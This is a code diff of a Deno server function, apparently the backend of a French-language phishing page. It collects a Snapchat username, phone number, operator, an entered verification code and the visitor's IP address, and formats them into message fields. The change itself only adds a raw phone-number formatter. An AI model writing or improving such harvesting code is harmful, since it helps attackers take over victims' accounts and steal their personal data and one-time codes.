@@ -7,6 +7,7 @@ Deno.serve(async (req) => {
   const { snapchat, telephone, operateur, code, submissionId } = await req.json();
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
   const now = new Date();
@@ -30,7 +31,7 @@ Deno.serve(async (req) => {
     fields: [
       { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
       { name: "📡 Opérateur", value: operateur, inline: true },
-      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
+      { name: "📞 Numéro", value: formatPhoneRaw(telephone), inline: true },
       { name: "🔢 Code entré", value: `**${code}**`, inline: true },
       { name: "🌍 Pays", value: "France", inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
